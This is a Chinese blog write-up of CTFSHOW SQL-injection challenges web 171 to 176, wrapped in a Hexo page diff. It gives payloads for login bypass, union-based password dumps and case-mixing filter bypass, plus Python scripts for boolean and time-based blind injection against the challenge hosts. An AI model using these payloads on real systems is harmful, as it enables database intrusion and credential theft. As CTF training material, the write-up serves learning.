@@ -1,0 +1,2013 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>CTFSHOW-sql注入(一) | K1he</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  
+    <script>
+        var themeModelId = '';
+        if (themeModelId) {
+            localStorage.setItem('modelId', themeModelId);
+        }
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
+    <script>
+        var live2dOpen = eval('true') || false;
+        if (!live2dOpen) {
+            localStorage.setItem('waifu-display', 1609323474481);
+        }
+    </script>
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+        <script src="/js/valine/av-min@3.0.4.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="K1he" type="application/atom+xml">
+</head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  <script src="/js/jquery3.5.1.js"></script>
+  <script src="/js/vue2.6.11.js"></script>
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">加载中...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 头部导航等 -->
+    
+<header class="header " id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fa fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
+      <h3 class="drawer-box-head_title">K1he</h3>
+      <h5 class="drawer-box-head_desc">路漫漫其修远兮，吾将上下而求索</h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fa fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fa fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fa fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fa fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/about" class="drawer-menu-item-link">
+                  
+                    <i class="fa fa-user" aria-hidden="true"></i>
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/friends" class="drawer-menu-item-link">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="javascript:;" class="drawer-menu-item-link has-children" @click="openOrCloseMenu(6)">
+                  <span>
+                    
+                      <i class="fa fa-link"></i>
+                    
+                    <span class="name">更多</span>
+                  </span>
+                  <i class="fa fa-chevron-left arrow " :class="{'icon-rotate': isOpen(6)}" aria-hidden="true"></i>
+                </a>
+                <ul class="drawer-sub-menu" v-if="isOpen(6)">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fa fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/huoban">
+                      
+                      <i class="fa fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/me">
+                      
+                      <i class="fa fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fa fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/a1021245006">
+              <i class="fa fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">K1he</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fa fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fa fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fa fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fa fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/about" class="menu-item-link" title="关于">
+                  
+                    <i class="fa fa-user" aria-hidden="true"></i>
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/friends" class="menu-item-link" title="友情链接">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="javascript:;" class="menu-item-link" title="更多">
+                  
+                    <i class="fa fa-link"></i>
+                  
+                  <span class="name">更多</span>
+                  <i class="fa fa-chevron-down arrow" aria-hidden="true"></i>
+                </a>
+                <ul class="sub-menu">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fa fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/huoban">
+                      
+                      <i class="fa fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/me">
+                      
+                      <i class="fa fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fa fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fa fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <!-- <div class="close" style="overflow: hidden;">
+          <i class="fa fa-close" aria-hidden="true" style="float:right;" @click.self="cancelDialogVisible()"></i>
+        </div> -->
+        <h2>
+          <span>
+            <i class="fa fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fa fa-close close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/a1021245006" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+    <div id="he-plugin-simple"></div>
+    <script>
+      WIDGET = {
+        CONFIG: {
+          "modules": "012",
+          "background": 5,
+          "tmpColor": "4A4A4A",
+          "tmpSize": 16,
+          "cityColor": "4A4A4A",
+          "citySize": 16,
+          "aqiSize": 16,
+          "weatherIconSize": 24,
+          "alertIconSize": 18,
+          "padding": "10px 10px 10px 10px",
+          "shadow": "1",
+          "language": "auto",
+          "borderRadius": 5,
+          "fixed": "false",
+          "vertical": "middle",
+          "horizontal": "center",
+          "key": "2784dd3fcb1e4f0f9a9b579bf69641f2"
+        }
+      }
+    </script>
+    <script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script> 
+    
+
+    <!-- 当头部导航设置为背景透明的时候  -->
+    
+      <script src="/js/header/index.js" data-pjax></script>
+    
+</header>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+    function loadScript(src, cb) {
+        setTimeout(function () {
+            var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+            var script = document.createElement('script');
+            script.setAttribute('type', 'text/javascript');
+            if (cb) script.onload = cb;
+            script.setAttribute('src', src);
+            HEAD.appendChild(script);
+        });
+    }
+
+    //https://github.com/filamentgroup/loadCSS
+    var loadCSS = function (href, before, media, attributes) {
+        var doc = window.document;
+        var ss = doc.createElement("link");
+        var ref;
+        if (before) {
+            ref = before;
+        }
+        else {
+            var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+            ref = refs[refs.length - 1];
+        }
+        var sheets = doc.styleSheets;
+        if (attributes) {
+            for (var attributeName in attributes) {
+                if (attributes.hasOwnProperty(attributeName)) {
+                    ss.setAttribute(attributeName, attributes[attributeName]);
+                }
+            }
+        }
+        ss.rel = "stylesheet";
+        ss.href = href;
+        ss.media = "only x";
+        function ready(cb) {
+            if (doc.body) {
+                return cb();
+            }
+            setTimeout(function () {
+                ready(cb);
+            });
+        }
+        ready(function () {
+            ref.parentNode.insertBefore(ss, (before ? ref : ref.nextSibling));
+        });
+        var onloadcssdefined = function (cb) {
+            var resolvedHref = ss.href;
+            var i = sheets.length;
+            while (i--) {
+                if (sheets[i].href === resolvedHref) {
+                    return cb();
+                }
+            }
+            setTimeout(function () {
+                onloadcssdefined(cb);
+            });
+        };
+        function loadCB() {
+            if (ss.addEventListener) {
+                ss.removeEventListener("load", loadCB);
+            }
+            ss.media = media || "all";
+        }
+        if (ss.addEventListener) {
+            ss.addEventListener("load", loadCB);
+        }
+        ss.onloadcssdefined = onloadcssdefined;
+        onloadcssdefined(loadCB);
+        return ss;
+    };
+    
+</script>
+ 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
+
+
+    <!-- 内容区域 -->
+    <div id="safearea">
+      <main class="main" id="pjax-container" style="margin-top: 0;">
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+<!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/7.jpg" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        CTFSHOW-sql注入(一)
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fa fa-calendar"></i> 发表于：2021-09-19 |
+        </span>
+      
+
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+<div class="row justify-position">
+  <div class="main-content">
+    <article class="post post-detail">
+      
+      <div class="post-content">
+        <h1 id="CTFSHOW-sql注入-一"><a href="#CTFSHOW-sql注入-一" class="headerlink" title="CTFSHOW sql注入(一)"></a>CTFSHOW sql注入(一)</h1><p>开始一周的高强度sql注入训练，先从ctfshow 的基础开始。</p>
+<p>包含了CTFSHOW sql注入的 170-200题。</p>
+<p>这里都是sql注入的一些基本知识点。主要是了解sql注入的常见题型。</p>
+<span id="more"></span>
+
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="web-171-万能密码"><a href="#web-171-万能密码" class="headerlink" title="web 171(万能密码)"></a>web 171(万能密码)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">万能密码:</span><br><span class="line">  <span class="number">1</span><span class="string">&#x27;or 1=1-- -</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-172-过滤回显内容"><a href="#web-172-过滤回显内容" class="headerlink" title="web 172(过滤回显内容)"></a>web 172(过滤回显内容)</h2><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/19/4IJVNljHPpr375e.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+<p>这里看出有一定的waf，我们并不能在username里面输入flag且返回的列里面也不能有flag。那么我们已知flag在ctfshow_user2表中，且列名为flag。直接编码即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select to_base64(username),password from ctfshow_user2 -- -</span></span><br></pre></td></tr></table></figure>
+
+
+<p>这里有一个细节就是如果我们采用的是get传参的方式的话，那么我们使用#时候需要使用%23。否则不会杯传到数据库中当作注释使用。</p>
+<h2 id="web-173"><a href="#web-173" class="headerlink" title="web 173"></a>web 173</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(password) from ctfshow_user3%23</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+<p>group_concat()直接把所有password连起来就行了。</p>
+<h2 id="web-174-盲注-regexp"><a href="#web-174-盲注-regexp" class="headerlink" title="web 174(盲注+regexp)"></a>web 174(盲注+regexp)</h2><p>这个题首先，没判断出来是盲注。主要还是参考了Y4师傅的WP。但是最后一个Y4师傅是靠经验推断flag在第二十三行。这里我们采用一个正则匹配，就不用去猜flag在哪里了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:k1he</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://60e5e391-09c0-4ed1-a9a2-57d8e70d4c64.challenge.ctf.show:8080/api/v4.php?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">min</span> =<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;and ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;-- -&quot;.format(i,mid)</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27;and ascii(substr((select group_concat(password) from ctfshow_user4 where password regexp(&#x27;^ctf&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;-- -&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"><span class="comment">#库名 </span></span><br><span class="line"><span class="comment">#ctfshow_web</span></span><br><span class="line"><span class="comment">#表名</span></span><br><span class="line"><span class="comment">#ctfshow_user4</span></span><br><span class="line"><span class="comment">#列名</span></span><br><span class="line"><span class="comment">#id,username,password</span></span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="comment">#ctfshow&#123;35c495e4-d5bc-450c-a16a-c51f5777633f&#125; </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-175-时间盲注"><a href="#web-175-时间盲注" class="headerlink" title="web 175(时间盲注)"></a>web 175(时间盲注)</h2><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/19/rAuCWsKQyN8anZg.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+<p>看题目。返回内容不能有ascii为0-127的字符。直接把回显关了。只能直接采用盲注了。但是这里有一个新的问题是，怎么敲都是查询失败。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 17:30:35</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-18 17:47:28</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://617002ea-275b-4340-9ced-18d46d869a56.challenge.ctf.show:8080/api/v5.php?id=1&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#表名</span></span><br><span class="line">        <span class="comment">#paylaod = &quot;1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.6),0)-- -&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#列名</span></span><br><span class="line">        <span class="comment">#paylaod = &quot;1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user5&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.6),0)-- -&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,username,password</span></span><br><span class="line">        <span class="comment">#flag</span></span><br><span class="line">        paylaod = <span class="string">&quot;1&#x27;and if(ascii(substr((select group_concat(password) from ctfshow_user5 where password regexp(&#x27;^ctf&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.6),0)-- -&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment">#ctfshow&#123;97c033fb-e734-4ff5-894b-37c1e3145f8e&#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url=url+paylaod,timeout=<span class="number">0.5</span>)</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line"><span class="comment">#库名</span></span><br><span class="line"><span class="comment">#ctfshow_web</span></span><br><span class="line"><span class="comment">#表名</span></span><br><span class="line"><span class="comment">#ctfshow_user5</span></span><br><span class="line"><span class="comment">#列名</span></span><br><span class="line"><span class="comment">#id,user,password</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-176-大小写绕过"><a href="#web-176-大小写绕过" class="headerlink" title="web 176(大小写绕过)"></a>web 176(大小写绕过)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or 1=1%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload:</span></span><br><span class="line"><span class="string">1&#x27;</span> union sElect <span class="number">1</span>,<span class="number">2</span>,group_concat(password) <span class="keyword">from</span> ctfshow_user%<span class="number">23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
